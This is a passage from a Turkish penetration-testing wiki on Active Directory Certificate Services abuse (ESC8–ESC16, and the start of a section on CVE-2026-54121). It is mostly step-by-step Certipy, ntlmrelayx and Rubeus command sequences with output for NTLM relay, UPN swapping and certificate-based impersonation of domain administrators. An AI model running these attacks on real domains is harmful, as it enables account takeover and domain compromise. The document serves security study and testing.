`msPKI-Enrollment-Servers` özelliği, kurumsal Certificate Authority'ler (CA'ler) tarafından Certificate Enrollment Service (CES) endpoint'lerini depolamak için kullanılır. Bu endpoint'ler **Certutil.exe** aracı kullanılarak ayrıştırılabilir ve listelenebilir:
```
certutil.exe -enrollmentServerURL -config DC01.DOMAIN.LOCAL\DOMAIN-CA
```
<figure><img src="../../../images/image (757).png" alt=""><figcaption></figcaption></figure>
```bash
Import-Module PSPKI
Get-CertificationAuthority | select Name,Enroll* | Format-List *
```
<figure><img src="../../../images/image (940).png" alt=""><figcaption></figcaption></figure>

#### Certify ile Abuse
```bash
## In the victim machine
# Prepare to send traffic to the compromised machine 445 port to 445 in the attackers machine
PortBender redirect 445 8445
rportfwd 8445 127.0.0.1 445
# Prepare a proxy that the attacker can use
socks 1080

## In the attackers
proxychains ntlmrelayx.py -t http://<AC Server IP>/certsrv/certfnsh.asp -smb2support --adcs --no-http-server

# Force authentication from victim to compromised machine with port forwards
execute-assembly C:\SpoolSample\SpoolSample\bin\Debug\SpoolSample.exe <victim> <compromised>
```
#### [Certipy](https://github.com/ly4k/Certipy) ile Abuse

Certificate request, varsayılan olarak Certipy tarafından, relay edilen account name değerinin `$` ile bitip bitmemesine göre `Machine` veya `User` template'i temel alınarak yapılır. Alternatif bir template belirtmek için `-template` parametresi kullanılabilir.

Daha sonra authentication'ı zorlamak için [PetitPotam](https://github.com/ly4k/PetitPotam) gibi bir technique kullanılabilir. Domain controller'larla çalışırken `-template DomainController` belirtilmesi gerekir.
```bash
certipy relay -ca ca.corp.local
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Targeting http://ca.corp.local/certsrv/certfnsh.asp
[*] Listening on 0.0.0.0:445
[*] Requesting certificate for 'CORP\\Administrator' based on the template 'User'
[*] Got certificate with UPN 'Administrator@corp.local'
[*] Certificate object SID is 'S-1-5-21-980154951-4172460254-2779440654-500'
[*] Saved certificate and private key to 'administrator.pfx'
[*] Exiting...
```
## No Security Extension - ESC9 <a href="#id-5485" id="id-5485"></a>

### Açıklama

ESC9 olarak adlandırılan, **`msPKI-Enrollment-Flag`** için yeni **`CT_FLAG_NO_SECURITY_EXTENSION`** (`0x80000`) değeri, bir sertifikaya **yeni `szOID_NTDS_CA_SECURITY_EXT` security extension** eklenmesini engeller. Bu flag, `StrongCertificateBindingEnforcement` değeri `1` olarak ayarlandığında (varsayılan ayar) önem kazanır; bu durum `2` ayarının tersidir. Kerberos veya Schannel için daha zayıf bir certificate mapping'in istismar edilebileceği senaryolarda (ESC10'da olduğu gibi) önemi artar; çünkü ESC9'un bulunmaması gereksinimleri değiştirmez.<sup>[[7]](#references)</sup>

Bu flag'in ayarının önem kazandığı koşullar şunlardır:

- `StrongCertificateBindingEnforcement`, `2` olarak ayarlanmamıştır (varsayılan değer `1`'dir) veya `CertificateMappingMethods`, `UPN` flag'ini içerir.
- Sertifika, `msPKI-Enrollment-Flag` ayarı içinde `CT_FLAG_NO_SECURITY_EXTENSION` flag'i ile işaretlenmiştir.
- Sertifika tarafından herhangi bir client authentication EKU belirtilmiştir.
- Başka bir hesabı compromise etmek için herhangi bir hesap üzerinde `GenericWrite` izinleri mevcuttur.

### Abuse Scenario

`John@corp.local` kullanıcısının `Jane@corp.local` üzerinde `GenericWrite` izinlerine sahip olduğunu ve hedefin `Administrator@corp.local` hesabını compromise etmek olduğunu varsayalım. `Jane@corp.local` kullanıcısının enroll olmasına izin verilen `ESC9` certificate template'i, `msPKI-Enrollment-Flag` ayarında `CT_FLAG_NO_SECURITY_EXTENSION` flag'i ile yapılandırılmıştır.

İlk olarak, `John`'un `GenericWrite` izni sayesinde `Jane`'in hash'i Shadow Credentials kullanılarak elde edilir:
```bash
certipy shadow auto -username John@corp.local -password Passw0rd! -account Jane
```
Ardından `Jane`'in `userPrincipalName` değeri, `@corp.local` etki alanı kısmı kasıtlı olarak atlanarak `Administrator` olarak değiştirilir:
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Administrator
```
Bu değişiklik, `Administrator@corp.local` değerinin `Administrator` kullanıcısının `userPrincipalName` değeri olarak ayrı kalması nedeniyle kısıtları ihlal etmez.

Bunun ardından, savunmasız olarak işaretlenen `ESC9` certificate template'i `Jane` olarak istenir:
```bash
certipy req -username jane@corp.local -hashes <hash> -ca corp-DC-CA -template ESC9
```
Sertifikanın `userPrincipalName` değerinin herhangi bir “object SID” içermeden `Administrator` değerini yansıttığı belirtilmiştir.

Ardından `Jane`'in `userPrincipalName` değeri, orijinali olan `Jane@corp.local` olarak geri döndürülür:
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Jane@corp.local
```
Verilen sertifikayla kimlik doğrulama denenmesi artık `Administrator@corp.local` hesabının NT hash değerini verir. Sertifikada domain belirtimi bulunmadığından komut `-domain <domain>` seçeneğini içermelidir:
```bash
certipy auth -pfx adminitrator.pfx -domain corp.local
```
## Zayıf Certificate Mappings - ESC10

### Açıklama

Domain controller üzerindeki iki registry key değeri ESC10 ile ilişkilendirilir:

- `HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\SecurityProviders\Schannel` altındaki `CertificateMappingMethods` için varsayılan değer `0x18` (`0x8 | 0x10`) şeklindedir; daha önce `0x1F` olarak ayarlanıyordu.
- `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Kdc` altındaki `StrongCertificateBindingEnforcement` için varsayılan ayar `1` değerindedir; daha önce `0` olarak ayarlanıyordu.<sup>[[7]](#references)</sup>

**Durum 1**

`StrongCertificateBindingEnforcement` değeri `0` olarak yapılandırıldığında.

**Durum 2**

`CertificateMappingMethods`, `UPN` bitini (`0x4`) içerdiğinde.

### Abuse Case 1

`StrongCertificateBindingEnforcement` değeri `0` olarak yapılandırıldığında, `GenericWrite` izinlerine sahip bir A hesabı, herhangi bir B hesabını compromise etmek için exploit edilebilir.

Örneğin, `Jane@corp.local` üzerinde `GenericWrite` izinlerine sahip olan bir attacker, `Administrator@corp.local` hesabını compromise etmeyi amaçlar. Prosedür ESC9'u takip eder ve herhangi bir certificate template'in kullanılmasına izin verir.

İlk olarak, `GenericWrite` kullanılarak Shadow Credentials aracılığıyla `Jane` hesabının hash'i alınır.
```bash
certipy shadow autho -username John@corp.local -p Passw0rd! -a Jane
```
Ardından, `Jane`'in `userPrincipalName` değeri, kısıtlama ihlalini önlemek amacıyla `@corp.local` kısmı kasıtlı olarak atlanarak `Administrator` olarak değiştirilir.
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Administrator
```
Bunun ardından, istemci kimlik doğrulamasını etkinleştiren bir sertifika, varsayılan `User` şablonu kullanılarak `Jane` adına istenir.
```bash
certipy req -ca 'corp-DC-CA' -username Jane@corp.local -hashes <hash>
```
`Jane`'in `userPrincipalName` değeri daha sonra özgün hali olan `Jane@corp.local` olarak geri döndürülür.
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Jane@corp.local
```
Elde edilen sertifikayla kimlik doğrulaması yapmak, `Administrator@corp.local` kullanıcısının NT hash'ini verir; sertifikada domain bilgileri bulunmadığından komutta domain belirtilmesi gerekir.
```bash
certipy auth -pfx administrator.pfx -domain corp.local
```
### Kötüye Kullanım Durumu 2

`CertificateMappingMethods`, `UPN` bit bayrağını (`0x4`) içerdiğinde, `GenericWrite` izinlerine sahip A hesabı, `userPrincipalName` özelliği bulunmayan tüm B hesaplarını tehlikeye atabilir. Buna makine hesapları ve yerleşik etki alanı yöneticisi `Administrator` da dahildir.

Buradaki amaç, `GenericWrite` yetkisinden yararlanarak önce Shadow Credentials aracılığıyla `Jane` hesabının hash'ini elde etmek ve ardından `DC$@corp.local` hesabını tehlikeye atmaktır.
```bash
certipy shadow auto -username John@corp.local -p Passw0rd! -account Jane
```
`Jane`'in `userPrincipalName` değeri ardından `DC$@corp.local` olarak ayarlanır.
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn 'DC$@corp.local'
```
İstemci kimlik doğrulaması için varsayılan `User` şablonu kullanılarak `Jane` adına bir sertifika istenir.
```bash
certipy req -ca 'corp-DC-CA' -username Jane@corp.local -hashes <hash>
```
`Jane`'in `userPrincipalName` değeri bu işlemden sonra özgün haline döndürülür.
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn 'Jane@corp.local'
```
Schannel üzerinden kimlik doğrulamak için Certipy’nin `-ldap-shell` seçeneği kullanılır ve kimlik doğrulamanın `u:CORP\DC$` olarak başarılı olduğu görülür.
```bash
certipy auth -pfx dc.pfx -dc-ip 172.16.126.128 -ldap-shell
```
LDAP shell üzerinden `set_rbcd` gibi komutlar, Resource-Based Constrained Delegation (RBCD) attack'lerini etkinleştirerek domain controller'ın ele geçirilmesine yol açabilir.
```bash
certipy auth -pfx dc.pfx -dc-ip 172.16.126.128 -ldap-shell
```
Bu güvenlik açığı, `userPrincipalName` bilgisi bulunmayan veya `userPrincipalName` değeri `sAMAccountName` ile eşleşmeyen tüm kullanıcı hesapları için de geçerlidir. Varsayılan `Administrator@corp.local` hesabı, yükseltilmiş LDAP ayrıcalıkları ve varsayılan olarak `userPrincipalName` değerinin bulunmaması nedeniyle başlıca hedeftir.

## Relaying NTLM to ICPR - ESC11

### Açıklama

CA Server `IF_ENFORCEENCRYPTICERTREQUEST` ile yapılandırılmamışsa, RPC service üzerinden signing olmadan NTLM relay attacks gerçekleştirilebilir. [Reference in here](https://blog.compass-security.com/2022/11/relaying-to-ad-certificate-services-over-rpc/).<sup>[[10]](#references)</sup>

`certipy` kullanarak `Enforce Encryption for Requests` seçeneğinin Disabled olup olmadığını enumerate edebilirsiniz; certipy `ESC11` Vulnerabilities bulunduğunu gösterecektir.
```bash
$ certipy find -u mane@domain.local -p 'password' -dc-ip 192.168.100.100 -stdout
Certipy v4.0.0 - by Oliver Lyak (ly4k)

Certificate Authorities
0
CA Name                             : DC01-CA
DNS Name                            : DC01.domain.local
Certificate Subject                 : CN=DC01-CA, DC=domain, DC=local
....
Enforce Encryption for Requests     : Disabled
....
[!] Vulnerabilities
ESC11                             : Encryption is not enforced for ICPR requests and Request Disposition is set to Issue

```
### Kötüye Kullanım Senaryosu

Bir relay server kurulması gerekir:
```bash
$ certipy relay -target 'rpc://DC01.domain.local' -ca 'DC01-CA' -dc-ip 192.168.100.100
Certipy v4.7.0 - by Oliver Lyak (ly4k)

[*] Targeting rpc://DC01.domain.local (ESC11)
[*] Listening on 0.0.0.0:445
[*] Connecting to ncacn_ip_tcp:DC01.domain.local[135] to determine ICPR stringbinding
[*] Attacking user 'Administrator@DOMAIN'
[*] Template was not defined. Defaulting to Machine/User
[*] Requesting certificate for user 'Administrator' with template 'User'
[*] Requesting certificate via RPC
[*] Successfully requested certificate
[*] Request ID is 10
[*] Got certificate with UPN 'Administrator@domain.local'
[*] Certificate object SID is 'S-1-5-21-1597581903-3066826612-568686062-500'
[*] Saved certificate and private key to 'administrator.pfx'
[*] Exiting...
```
Not: Domain controller'lar için DomainController'da `-template` belirtmeliyiz.

Veya [sploutchy'nin impacket fork'unu](https://github.com/sploutchy/impacket) kullanarak:
```bash
$ ntlmrelayx.py -t rpc://192.168.100.100 -rpc-mode ICPR -icpr-ca-name DC01-CA -smb2support
```
## YubiHSM ile ADCS CA'ya Shell erişimi - ESC12

### Açıklama

Administrators, Certificate Authority'yi "Yubico YubiHSM2" gibi harici bir cihazda depolayacak şekilde yapılandırabilir.

USB device CA server'a bir USB portu üzerinden bağlanırsa veya CA server bir virtual machine ise USB device server kullanılırsa, Key Storage Provider'ın YubiHSM'deki key'leri oluşturup kullanabilmesi için bir authentication key (bazen "password" olarak adlandırılır) gerekir.

Bu key/password, registry'de `HKEY_LOCAL_MACHINE\SOFTWARE\Yubico\YubiHSM\AuthKeysetPassword` altında cleartext olarak depolanır.

Reference [here](https://pkiblog.knobloch.info/esc12-shell-access-to-adcs-ca-with-yubihsm).<sup>[[11]](#references)</sup>

### Kötüye Kullanım Senaryosu

CA'nın private key'i fiziksel bir USB device üzerinde depolanıyorsa ve shell access elde ettiyseniz, key'i kurtarmak mümkündür.

İlk olarak CA certificate'ı (bu public'tir) elde etmeniz ve ardından:
```cmd
# import it to the user store with CA certificate
$ certutil -addstore -user my <CA certificate file>

# Associated with the private key in the YubiHSM2 device
$ certutil -csp "YubiHSM Key Storage Provider" -repairstore -user my <CA Common Name>
```
Son olarak, CA certificate ve private key kullanarak yeni bir arbitrary certificate forge etmek için `certutil -sign` komutunu kullanın.

## OID Group Link Abuse - ESC13

### Açıklama

`msPKI-Certificate-Policy` attribute'u, issuance policy'nin certificate template'e eklenmesine olanak tanır. Issuance policy'leri oluşturmaktan sorumlu `msPKI-Enterprise-Oid` objects, PKI OID container'ın Configuration Naming Context'inde (CN=OID,CN=Public Key Services,CN=Services) keşfedilebilir. Bir policy, bu object's `msDS-OIDToGroupLink` attribute'u kullanılarak bir AD group'a bağlanabilir; bu da bir system'in certificate'ı sunan user'ı, sanki group'un member'ıymış gibi authorize etmesini sağlar. [Buradaki reference](https://posts.specterops.io/adcs-esc13-abuse-technique-fda4272fbd53).<sup>[[12]](#references)</sup>

Başka bir deyişle, bir user'ın certificate enroll etme izni olduğunda ve certificate bir OID group'a bağlı olduğunda, user bu group'un privileges'larını devralabilir.

OIDToGroupLink'i bulmak için [Check-ADCSESC13.ps1](https://github.com/JonasBK/Powershell/blob/master/Check-ADCSESC13.ps1) kullanın:
```bash
Enumerating OIDs
------------------------
OID 23541150.FCB720D24BC82FBD1A33CB406A14094D links to group: CN=VulnerableGroup,CN=Users,DC=domain,DC=local

OID DisplayName: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID DistinguishedName: CN=23541150.FCB720D24BC82FBD1A33CB406A14094D,CN=OID,CN=Public Key Services,CN=Services,CN=Configuration,DC=domain,DC=local
OID msPKI-Cert-Template-OID: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID msDS-OIDToGroupLink: CN=VulnerableGroup,CN=Users,DC=domain,DC=local
------------------------
Enumerating certificate templates
------------------------
Certificate template VulnerableTemplate may be used to obtain membership of CN=VulnerableGroup,CN=Users,DC=domain,DC=local

Certificate template Name: VulnerableTemplate
OID DisplayName: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID DistinguishedName: CN=23541150.FCB720D24BC82FBD1A33CB406A14094D,CN=OID,CN=Public Key Services,CN=Services,CN=Configuration,DC=domain,DC=local
OID msPKI-Cert-Template-OID: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID msDS-OIDToGroupLink: CN=VulnerableGroup,CN=Users,DC=domain,DC=local
------------------------
```
### Abuse Senaryosu

Bir kullanıcının sahip olduğu izinleri `certipy find` veya `Certify.exe find /showAllPermissions` kullanarak bulun.

`John`, `VulnerableTemplate` için enroll iznine sahipse kullanıcı, `VulnerableGroup` grubunun ayrıcalıklarını devralabilir.

Yapması gereken tek şey template'i belirtmektir; `OIDToGroupLink` haklarına sahip bir certificate alacaktır.
```bash
certipy req -u "John@domain.local" -p "password" -dc-ip 192.168.100.100 -target "DC01.domain.local" -ca 'DC01-CA' -template 'VulnerableTemplate'
```
## Savunmasız Sertifika Yenileme Yapılandırması - ESC14

### Açıklama

https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc14-weak-explicit-certificate-mapping adresindeki açıklama oldukça kapsamlıdır. Aşağıda orijinal metinden bir alıntı yer almaktadır.<sup>[[14]](#references)</sup>

ESC14, temel olarak Active Directory kullanıcı veya bilgisayar hesaplarındaki `altSecurityIdentities` özniteliğinin yanlış kullanılması ya da güvenli olmayan şekilde yapılandırılması yoluyla ortaya çıkan "zayıf açık sertifika eşleme" güvenlik açıklarını ele alır. Çok değerli bu öznitelik, yöneticilerin kimlik doğrulama amacıyla X.509 sertifikalarını bir AD hesabıyla manuel olarak ilişkilendirmesine olanak tanır. Bu açık eşlemeler kullanıldığında, genellikle sertifikanın SAN alanındaki UPN'lere veya DNS adlarına ya da `szOID_NTDS_CA_SECURITY_EXT` güvenlik uzantısında bulunan SID'ye dayanan varsayılan sertifika eşleme mantığını geçersiz kılabilir.

`altSecurityIdentities` özniteliğinde bir sertifikayı tanımlamak için kullanılan dize değeri fazla kapsamlı olduğunda, kolayca tahmin edilebildiğinde, benzersiz olmayan sertifika alanlarına dayandığında veya kolayca taklit edilebilen sertifika bileşenlerini kullandığında eşleme "zayıf" olarak kabul edilir. Bir saldırgan ayrıcalıklı bir hesap için bu şekilde zayıf tanımlanmış açık eşlemeyle eşleşen bir sertifika elde edebilir ya da oluşturabilirse, bu sertifikayı kullanarak ilgili hesap olarak kimlik doğrulaması gerçekleştirebilir ve hesabı taklit edebilir.

Potansiyel olarak zayıf `altSecurityIdentities` eşleme dizelerine örnekler:

- Yalnızca yaygın bir Subject Common Name (CN) üzerinden eşleme: ör. `X509:<S>CN=SomeUser`. Bir saldırgan bu CN değerine sahip bir sertifikayı daha az güvenli bir kaynaktan elde edebilir.
- Belirli bir seri numarası veya subject key identifier gibi ek nitelikler olmadan aşırı genel Issuer Distinguished Name (DN) veya Subject DN kullanılması: ör. `X509:<I>CN=SomeInternalCA<S>CN=GenericUser`.
- Bir saldırganın meşru olarak elde edebileceği veya oluşturabileceği bir sertifikada karşılayabileceği diğer tahmin edilebilir kalıpların ya da kriptografik olmayan tanımlayıcıların kullanılması (örneğin bir CA ele geçirilmişse veya ESC1'de olduğu gibi savunmasız bir template bulunmuşsa).

`altSecurityIdentities` özniteliği eşleme için çeşitli biçimleri destekler:

- `X509:<I>IssuerDN<S>SubjectDN` (tam Issuer ve Subject DN değerleriyle eşler)
- `X509:<SKI>SubjectKeyIdentifier` (sertifikanın Subject Key Identifier uzantısındaki değerle eşler)
- `X509:<SR>SerialNumberBackedByIssuerDN` (seri numarasıyla eşler; Issuer DN tarafından örtük olarak nitelendirilir) - bu standart bir biçim değildir; genellikle `<I>IssuerDN<SR>SerialNumber` kullanılır.
- `X509:<RFC822>EmailAddress` (SAN alanındaki bir RFC822 adıyla, genellikle bir e-posta adresiyle eşler)
- `X509:<SHA1-PUKEY>Thumbprint-of-Raw-PublicKey` (sertifikanın ham public key değerinin SHA1 hash'iyle eşler - genel olarak güçlüdür)

Bu eşlemelerin güvenliği, eşleme dizesinde kullanılan sertifika tanımlayıcılarının özgüllüğüne, benzersizliğine ve kriptografik gücüne büyük ölçüde bağlıdır. Domain Controller'larda güçlü sertifika binding modları etkin olsa bile (bunlar temel olarak SAN UPN/DNS değerlerine ve SID uzantısına dayalı örtük eşlemeleri etkiler), hatalı yapılandırılmış bir `altSecurityIdentities` girdisi, eşleme mantığının kendisi hatalı veya aşırı izin verici ise kimlik taklidi için doğrudan bir yol oluşturabilir.
### Abuse Scenario

ESC14, Active Directory'deki (AD) **açık sertifika eşlemelerini**, özellikle de `altSecurityIdentities` özniteliğini hedef alır. Bu öznitelik ayarlanmışsa (tasarım gereği veya yanlış yapılandırma sonucunda), saldırganlar eşlemeyle eşleşen sertifikaları sunarak hesapları taklit edebilir.

#### Scenario A: Saldırgan `altSecurityIdentities` Özniteliğine Yazabiliyor

**Ön koşul**: Saldırganın hedef hesabın `altSecurityIdentities` özniteliğine yazma izinleri vardır veya hedef AD nesnesi üzerinde aşağıdaki izinlerden birine sahip olarak bu izni verme yetkisi vardır:
- `altSecurityIdentities` write property
- `Public-Information` write property
- Write property (all)
- `WriteDACL`
- `WriteOwner`*
- `GenericWrite`
- `GenericAll`
- Owner*.
#### Scenario B: Hedefte X509RFC822 (E-posta) Üzerinden Zayıf Eşleme Var

- **Ön koşul**: Hedefin `altSecurityIdentities` içinde zayıf bir X509RFC822 eşlemesi vardır. Saldırgan, kurbanın mail özniteliğini hedefin X509RFC822 adıyla eşleşecek şekilde ayarlayabilir, kurban olarak bir sertifika enroll edebilir ve bu sertifikayı hedef olarak kimlik doğrulaması yapmak için kullanabilir.
#### Scenario C: Hedefte X509IssuerSubject Eşlemesi Var

- **Ön koşul**: Hedefin `altSecurityIdentities` içinde zayıf bir X509IssuerSubject açık eşlemesi vardır.Saldırgan, bir victim principal üzerindeki `cn` veya `dNSHostName` özniteliğini hedefin X509IssuerSubject eşlemesindeki subject ile eşleşecek şekilde ayarlayabilir. Ardından saldırgan, victim olarak bir sertifika enroll edebilir ve bu sertifikayı hedef olarak kimlik doğrulaması yapmak için kullanabilir.
#### Scenario D: Hedefte X509SubjectOnly Eşlemesi Var

- **Ön koşul**: Hedefin `altSecurityIdentities` içinde zayıf bir X509SubjectOnly açık eşlemesi vardır. Saldırgan, bir victim principal üzerindeki `cn` veya `dNSHostName` özniteliğini hedefin X509SubjectOnly eşlemesindeki subject ile eşleşecek şekilde ayarlayabilir. Ardından saldırgan, victim olarak bir sertifika enroll edebilir ve bu sertifikayı hedef olarak kimlik doğrulaması yapmak için kullanabilir.
### somut işlemler
#### Scenario A

`Machine` sertifika template'inden bir sertifika isteyin
```bash
.\Certify.exe request /ca:<ca> /template:Machine /machine
```
Sertifikayı kaydedin ve dönüştürün
```bash
certutil -MergePFX .\esc13.pem .\esc13.pfx
```
Kimlik doğrulama (sertifikayı kullanarak)
```bash
.\Rubeus.exe asktgt /user:<user> /certificate:C:\esc13.pfx /nowrap
```
Temizleme (isteğe bağlı)
```bash
Remove-AltSecIDMapping -DistinguishedName "CN=TargetUserA,CN=Users,DC=external,DC=local" -MappingString "X509:<I>DC=local,DC=external,CN=external-EXTCA01-CA<SR>250000000000a5e838c6db04f959250000006c"
```
Çeşitli attack senaryolarındaki daha spesifik attack yöntemleri için lütfen şuraya başvurun: [adcs-esc14-abuse-technique](https://posts.specterops.io/adcs-esc14-abuse-technique-333a004dc2b9#aca0).<sup>[[13]](#references)</sup>

## EKUwu Application Policies(CVE-2024-49019) - ESC15

### Açıklama

https://trustedsec.com/blog/ekuwu-not-just-another-ad-cs-esc adresindeki açıklama son derece kapsamlıdır. Aşağıda orijinal metinden bir alıntı yer almaktadır.<sup>[[15]](#references)</sup>

Yerleşik varsayılan version 1 certificate template'lerini kullanarak bir attacker, template'te belirtilen yapılandırılmış Extended Key Usage özniteliklerine kıyasla öncelikli olan application policies'leri içerecek şekilde bir CSR oluşturabilir. Tek gereksinim enrollment haklarıdır ve **_WebServer_** template'i kullanılarak client authentication, certificate request agent ve codesigning certificate'leri oluşturmak için kullanılabilir.

### Abuse

Aşağıda, daha ayrıntılı kullanım yöntemlerini görmek için [bu bağlantıya]((https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc15-arbitrary-application-policy-injection-in-v1-templates-cve-2024-49019-ekuwu) başvurulmuştur.<sup>[[14]](#references)</sup>


Certipy'nin `find` komutu, CA unpatched durumdaysa ESC15'e karşı potansiyel olarak savunmasız V1 template'lerini belirlemeye yardımcı olabilir.
```bash
certipy find -username cccc@aaa.htb -password aaaaaa -dc-ip 10.0.0.100
```
#### Senaryo A: Schannel üzerinden Doğrudan Impersonation

**Adım 1: "Client Authentication" Application Policy ve hedef UPN enjekte ederek bir sertifika isteyin.** Saldırgan `attacker@corp.local`, enrollee tarafından sağlanan subject'e izin veren "WebServer" V1 template'ini kullanarak `administrator@corp.local` hesabını hedefler.
```bash
certipy req \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -target 'CA.CORP.LOCAL' \
-ca 'CORP-CA' -template 'WebServer' \
-upn 'administrator@corp.local' -sid 'S-1-5-21-...-500' \
-application-policies 'Client Authentication'
```
- `-template 'WebServer'`: "Enrollee supplies subject" özelliğine sahip güvenlik açığı bulunan V1 template.
- `-application-policies 'Client Authentication'`: CSR'nin Application Policies extension'ına `1.3.6.1.5.5.7.3.2` OID'sini ekler.
- `-upn 'administrator@corp.local'`: Impersonation için SAN'daki UPN'yi ayarlar.

**Step 2: Elde edilen certificate'ı kullanarak Schannel (LDAPS) üzerinden kimlik doğrulaması yapın.**
```bash
certipy auth -pfx 'administrator.pfx' -dc-ip '10.0.0.100' -ldap-shell
```
#### Senaryo B: Enrollment Agent Abuse ile PKINIT/Kerberos Impersonation

**Adım 1: "Enrollee supplies subject" özelliğine sahip bir V1 template'tan, "Certificate Request Agent" Application Policy enjekte ederek certificate talep edin.** Bu certificate, saldırganın (`attacker@corp.local`) enrollment agent olmasını sağlar. Burada saldırganın kendi kimliği için herhangi bir UPN belirtilmez; çünkü amaç agent yeteneğini elde etmektir.
```bash
certipy req \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -target 'CA.CORP.LOCAL' \
-ca 'CORP-CA' -template 'WebServer' \
-application-policies 'Certificate Request Agent'
```
- `-application-policies 'Certificate Request Agent'`: OID `1.3.6.1.4.1.311.20.2.1` enjekte eder.

**Adım 2: Ayrıcalıklı bir hedef kullanıcı adına certificate request yapmak için "agent" certificate'ını kullanın.** Bu, 1. Adım'daki certificate'ın agent certificate olarak kullanıldığı, ESC3 benzeri bir adımdır.
```bash
certipy req \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -target 'CA.CORP.LOCAL' \
-ca 'CORP-CA' -template 'User' \
-pfx 'attacker.pfx' -on-behalf-of 'CORP\Administrator'
```
**Adım 3: "on-behalf-of" sertifikasını kullanarak ayrıcalıklı kullanıcı olarak kimlik doğrulaması yapın.**
```bash
certipy auth -pfx 'administrator.pfx' -dc-ip '10.0.0.100'
```
## CA'de Security Extension Devre Dışı (Global)-ESC16

### Açıklama

**ESC16 (Eksik szOID_NTDS_CA_SECURITY_EXT Extension üzerinden Yetki Yükseltme)**, AD CS yapılandırmasının tüm sertifikalara **szOID_NTDS_CA_SECURITY_EXT** extension'ının eklenmesini zorunlu kılmadığı senaryoyu ifade eder. Bu durumda saldırgan:

1. **SID binding** olmadan bir sertifika talep edebilir.

2. Bu sertifikayı **herhangi bir hesap olarak authentication** için kullanabilir; örneğin yüksek ayrıcalıklı bir hesabı (Domain Administrator gibi) taklit edebilir.

Ayrıntılı prensip hakkında daha fazla bilgi edinmek için bu makaleye de başvurabilirsiniz:https://medium.com/@muneebnawaz3849/ad-cs-esc16-misconfiguration-and-exploitation-9264e022a8c6<sup>[[16]](#references)</sup>

### Abuse

Aşağıdaki içerik [bu bağlantıda](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc16-security-extension-disabled-on-ca-globally) referans gösterilmiştir; daha ayrıntılı kullanım yöntemlerini görmek için tıklayın.<sup>[[14]](#references)</sup>

Active Directory Certificate Services (AD CS) ortamının **ESC16**'ya karşı savunmasız olup olmadığını belirlemek için
```bash
certipy find -u 'attacker@corp.local' -p '' -dc-ip 10.0.0.100 -stdout -vulnerable
```
**Adım 1: Kurban hesabının başlangıç UPN'sini okuyun (İsteğe bağlı - geri yükleme için).
```bash
certipy account \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -user 'victim' \
read
```
**Adım 2: Kurban hesabının UPN'sini hedef yöneticinin `sAMAccountName`'iyle güncelleyin.
```bash
certipy account \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -upn 'administrator' \
-user 'victim' update
```
**Adım 3: (Gerekirse) "victim" hesabının kimlik bilgilerini edinin (ör. Shadow Credentials aracılığıyla).**
```shell
certipy shadow \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -account 'victim' \
auto
```
**Adım 4: ESC16-vulnerable CA üzerinde _uygun herhangi bir client authentication template_'inden (ör. "User") "victim" kullanıcı olarak bir certificate isteyin.** CA, ESC16 nedeniyle, template'in bu extension'a yönelik özel ayarlarından bağımsız olarak, verilen certificate'tan SID security extension'ı otomatik olarak çıkarır. Kerberos credential cache environment variable'ını ayarlayın (shell command):
```bash
export KRB5CCNAME=victim.ccache
```
Ardından sertifikayı isteyin:
```bash
certipy req \
-k -dc-ip '10.0.0.100' \
-target 'CA.CORP.LOCAL' -ca 'CORP-CA' \
-template 'User'
```
**Adım 5: "victim" hesabının UPN'sini geri alın.**
```bash
certipy account \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -upn 'victim@corp.local' \
-user 'victim' update
```
**Adım 6: Hedef yöneticisi olarak kimlik doğrulaması yapın.**
```bash
certipy auth \
-dc-ip '10.0.0.100' -pfx 'administrator.pfx' \
-username 'administrator' -domain 'corp.local'
```
## Rogue LDAP/LSA chase callback identity substitution (Certighost / CVE-2026-54121)

### Açıklama

**Certighost**, CA'nın verilen sertifikaya yerleştirilmesi gereken kimliği çözümlemek için requester-supplied request attributes'a güvendiği bir **AD CS enrollment chase / callback path**'i kötüye kullanır. Public PoC'ta oluşturulan request şunları içerir:<sup>[[1]](#references)[[2]](#references)</sup>

- **`cdc`**: CA'nın bağlanacağı attacker-controlled host/IP
- **`rmd`**: Taklit edilecek **target Domain Controller DNS name**

CA bu chase'i takip ederse **SMB/LSA (`445`)** ve **LDAP (`389`)** üzerinden attacker'a bağlanır. Attacker, callback session'ın geçerli bir domain principal olarak authenticate olması için **real machine account** kullanır (genellikle varsayılan **`ms-DS-MachineAccountQuota`** aracılığıyla oluşturulur), ancak rogue services bunun yerine **target DC**'nin identity attributes değerlerini döndürür:

- `sAMAccountName`
- `objectSid` / SID
- `dNSHostName`

